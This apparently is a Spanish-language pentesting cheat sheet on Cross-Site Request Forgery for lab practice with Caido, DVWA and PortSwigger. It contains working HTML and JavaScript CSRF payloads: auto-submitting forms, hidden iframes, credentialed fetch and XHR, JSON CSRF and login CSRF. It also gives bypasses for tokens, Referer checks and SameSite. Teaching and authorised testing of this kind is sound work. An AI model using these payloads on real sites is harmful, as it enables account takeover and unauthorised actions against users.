<div align="center">

# 🔁 CSRF
### Cross-Site Request Forgery — Forzado de Acciones Autenticadas

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-CSRF-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **CSRF:** los navegadores adjuntan cookies automáticamente a toda request hacia un dominio, sin importar qué sitio la inició. El atacante hospeda una página que envía silenciosamente un request de estado al sitio víctima. El navegador lo envía con la cookie de sesión → el servidor lo ve como acción legítima. Requiere: (1) acción autenticada relevante, (2) sesión manejada solo por cookie, (3) sin token CSRF o token predecible.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Qué Buscar](#-qué-buscar) |
| 04 | [🧪 PoC HTML](#-poc-html) |
| 05 | [🧱 PoC Avanzado](#-poc-avanzado) |
| 06 | [🛡️ Bypass de Defensas](#️-bypass-de-defensas) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [🧠 Casos Típicos](#-casos-típicos) |
| 09 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 10 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | CSRF |
| **Juice Shop** | Acciones autenticadas y cambios de perfil según reto |
| **PortSwigger** | Cross-site request forgery |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `HTTP History`, `Replay`, `Assistant` (PoC CSRF) |
| **Navegador** | Ejecutar PoC HTML en sesión de lab |

> [!TIP]
> Caido Assistant puede generar PoC HTML automáticamente desde `HTTP History`. Usarlo como punto de partida antes de editar manualmente.

---

## 🔍 Qué Buscar

![Context](https://img.shields.io/badge/Análisis-Defensas-ff6b00?style=flat-square)

### `[01]` Acción sensible

- cambio de email o password
- añadir usuario o cambiar roles
- update de perfil
- transferencia o compra

### `[02]` Ausencia de defensas

- `POST` sin token CSRF
- token reusable entre sesiones
- token no ligado a sesión del usuario
- acción accesible por método `GET`
- validación débil de `Origin` / `Referer`
- cookie sin `SameSite` o con `SameSite=None`

> [!NOTE]
> La ausencia de `csrf=...` en body o header es el primer indicador. Confirmar intentando repetir el request desde otra sesión.

---

## 🧪 PoC HTML

![Context](https://img.shields.io/badge/PoC-HTML-a855f7?style=flat-square)

### `[01]` POST básico — auto-submit

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://victim.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com"/>
    </form>
  </body>
</html>
```

### `[02]` POST via iframe oculto

```html
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="https://victim.com/change-email" target="csrfframe">
  <input type="hidden" name="email" value="attacker@evil.com"/>
</form>
<script>document.forms[0].submit();</script>
```

### `[03]` GET via img (acción por GET)

```html
<img src="https://victim.com/admin/delete?id=5" width="0" height="0">
<img src="https://victim.com/email?new=attacker@evil.com" style="display:none">
```

### `[04]` GET via redirect

```html
<script>location="https://victim.com/transfer?amount=1000&to=attacker"</script>
```

---

## 🧱 PoC Avanzado

![Context](https://img.shields.io/badge/PoC-Avanzado-ff3c6e?style=flat-square)

### `[01]` XMLHttpRequest con credenciales

```javascript
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", "https://victim.com/account/change");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=attacker@evil.com&action=update");
```

### `[02]` Fetch API con credenciales

```javascript
fetch("https://victim.com/api/settings", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
```

### `[03]` JSON CSRF via text/plain enctype

```html
<!-- Envía body: {"action":"delete","id":5, "x":"="} -->
<form enctype="text/plain" method="POST" action="https://victim.com/api">
  <input name='{"action":"delete","id":' value='5, "x":"'}/>
</form>
<script>document.forms[0].submit();</script>
```

### `[04]` Login CSRF (sesión bajo control del atacante)

```html
<form action="https://victim.com/login" method="POST">
  <input type="hidden" name="username" value="attacker"/>
  <input type="hidden" name="password" value="attacker_pass"/>
</form>
<script>document.forms[0].submit();</script>
```

---

## 🛡️ Bypass de Defensas

![Context](https://img.shields.io/badge/Bypass-Tokens%20%26%20Headers-ff3c6e?style=flat-square)

### Token ausente o vacío

```html
<!-- Muchas implementaciones validan que el token exista, no que sea correcto -->
<input type="hidden" name="csrf_token" value=""/>
```

### Cambio de método POST → GET

```
GET /account/update?email=attacker@evil.com HTTP/1.1
# Si endpoint acepta ambos métodos
```

### Method override

```html
<!-- Frameworks como Rails/Laravel honoran _method -->
<input type="hidden" name="_method" value="DELETE">
```

### Supresión de Referer

```html
<meta name="referrer" content="no-referrer">
```

### Bypass Referer via path

```html
<meta name="referrer" content="unsafe-url"/>
<script>history.pushState("","","?victim.com");</script>
<!-- Referer: https://attacker.com?victim.com -->
```

### SameSite=Lax — GET state-change

```
Si la app modifica estado por GET:
<script>location="https://victim.com/action?param=malicious"</script>
```

### Token no ligado a sesión

```
Usar token CSRF propio en request de otra víctima.
Si servidor valida existencia pero no relación con sesión, funciona.
```

> [!IMPORTANT]
> Probar PoC en perfil/navegador diferente donde la sesión de víctima esté activa. No usar la misma sesión del atacante.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request sensible

En `HTTP History` → acción que modifica estado del usuario.

### `[02]` Revisar defensas

- `csrf=...` en body o header
- header `Origin` / `Referer`
- atributo `SameSite` en `Set-Cookie`

### `[03]` Replay de prueba

- quitar token del body
- cambiar `POST` a `GET`
- repetir token desde otra sesión

### `[04]` Construir PoC

HTML mínimo con form auto-submit. Abrir en navegador con sesión víctima activa.

---

## 🧠 Casos Típicos

| Caso | Qué probar |
|------|------------|
| **Sin token** | PoC directo sin modificaciones |
| **Token opcional** | omitir parámetro del body |
| **Token no ligado a sesión** | reutilizar token propio en request ajeno |
| **Token duplicado cookie/body** | manipular doble envío |
| **SameSite Lax** | request GET que modifica estado |
| **Validación Referer débil** | header ausente / bypass con path |

---

## 🧭 Ruta de Práctica

1. DVWA CSRF
2. PortSwigger: no defense
3. PortSwigger: token optional / validation skipped
4. PortSwigger: token not tied to session
5. PortSwigger: SameSite bypass
6. PortSwigger: Referer-based defense

---

## 📝 Checklist

- [ ] request sensible aislado
- [ ] dependencias mínimas identificadas
- [ ] token analizado (presente / ausente / reusable)
- [ ] cookie policy revisada (SameSite)
- [ ] PoC reproducible en lab

---

## 🔗 Referencias

- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [PayloadsAllTheThings — CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
